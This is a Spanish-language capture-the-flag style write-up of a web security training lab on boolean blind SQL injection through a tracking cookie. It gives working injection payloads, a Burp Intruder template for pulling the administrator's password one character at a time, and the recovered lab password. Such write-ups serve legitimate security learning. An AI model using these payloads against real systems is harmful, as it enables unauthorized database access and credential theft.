# Lab 12: Blind SQL injection with conditional responses

**Nivel:** Practitioner
**Estado:** ✅ Solved

## Descripción

A diferencia de todos los laboratorios anteriores, aquí la aplicación **no devuelve datos ni errores SQL visibles**: la consulta vulnerable (inyectada a través de la cookie `TrackingId`) se ejecuta en el backend, pero la única señal observable es si aparece o no el texto **"Welcome back!"** en la respuesta. Esto obliga a inferir información carácter por carácter mediante preguntas booleanas (verdadero/falso), la técnica clásica de **blind SQL injection**.

## Metodología

### 1. Confirmar el punto de inyección

Se interceptó la petición `GET /` con el `TrackingId` en la cookie y se probó:

```
Cookie: TrackingId=xyz' AND '1'='1
```
→ Aparece "Welcome back!" (condición verdadera).

```
Cookie: TrackingId=xyz' AND '1'='2
```
→ No aparece "Welcome back!" (condición falsa).

Esto confirma que el booleano inyectado controla directamente el oráculo de la aplicación.

### 2. Confirmar existencia de tabla y usuario

```
xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
→ Verdadero, confirma que existe la tabla `users` y el usuario `administrator`.

**Detalle clave de sintaxis:** el payload termina en `='a` **sin cerrar la comilla**. La aplicación construye la consulta como `... = 'VALOR_INYECTADO'`, así que la comilla de cierre que agrega la propia aplicación termina cerrando nuestro string `'a`, dejando la consulta balanceada sin necesitar comentario (`--` o `#`).

### 3. Determinar la longitud de la contraseña (búsqueda binaria)

```
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a
```

Se probaron distintos valores de `N` mediante búsqueda binaria (por ejemplo `>19`, `>9`, `>4`, `>1`, `=20`) hasta confirmar que la contraseña tiene exactamente **20 caracteres**.

### 4. Extraer cada carácter con Burp Intruder

Con la longitud conocida, se cambió la consulta para extraer un carácter a la vez con `SUBSTRING`:

```
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

- Se envió la petición a **Burp Intruder** (Sniper attack).
- Se marcó como posición de payload **solo la letra candidata** (`'§a§`).
- Como payloads se usó una lista simple con el rango `a-z` y `0-9` (36 valores), asumiendo —según la descripción del laboratorio— que la contraseña solo contiene caracteres alfanuméricos en minúscula.
- En **Settings → Grep - Match** se agregó la expresión `Welcome back` para marcar automáticamente qué fila de la tabla de resultados corresponde al carácter correcto.
- Se repitió el ataque cambiando el offset de `SUBSTRING(password, N, 1)` de `1` a `20`, anotando el carácter marcado en cada corrida.

### Obstáculos y correcciones durante la extracción

- **Comentario SQL mal aplicado:** en un primer intento se cerró manualmente la comilla del carácter candidato y se agregó `-- ` o `#` al final. Esto generaba fallos intermitentes porque el espacio requerido por `--` podía perderse al estar seguido de `; session=...` en la misma cabecera `Cookie`. La sintaxis oficial (sin cerrar la comilla, dejando que la aplicación la absorba) resultó más robusta y es la que finalmente funcionó de forma consistente.
- **Expiración de sesión a mitad de prueba:** la aplicación invalida la sesión después de cierto tiempo o número de peticiones. Varias rachas de pruebas manuales en Repeater fallaron en bloque simplemente porque la cookie `session` ya no era válida, no porque la lógica SQL estuviera mal. La solución fue recargar la página para obtener cookies frescas y lanzar el ataque de Intruder **inmediatamente** después (Intruder completa las 36 peticiones en segundos, antes de que la sesión expire).
- **Burp Community Edition no tiene Session Handling Rules** (función de Burp Pro para refrescar cookies automáticamente entre peticiones), así que no fue posible automatizar la renovación de sesión dentro de un mismo ataque de Intruder; la solución práctica fue minimizar el tiempo entre refrescar la página y lanzar cada ataque.

## Payload final (plantilla usada en Intruder, repetida para cada posición 1–20)

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,N,1) FROM users WHERE username='administrator')='§a§; session=...
```

## Resultado

Carácter por carácter, se reconstruyó la contraseña completa del administrador:

```
aerszms44dxdce6tmgc1
```

Con usuario `administrator` y esa contraseña se inició sesión en **My account**, resolviendo el laboratorio (badge **Solved**).

## Conclusión

Este laboratorio es el ejercicio central de **blind SQL injection booleano**: cuando la aplicación no filtra errores ni expone datos directamente, un atacante puede seguir extrayendo información completa reformulando cada pregunta como una condición verdadero/falso y automatizando la extracción carácter por carácter con Burp Intruder. También deja una lección práctica importante más allá de la teoría: en escenarios reales conviene prestar atención a **detalles de sesión/estado del servidor** (expiración de cookies, balanceo de comillas) tanto como a la lógica SQL en sí, ya que un fallo de "falso" puede deberse a un error de sintaxis o a una sesión caducada, no solo a que la condición probada sea realmente falsa.
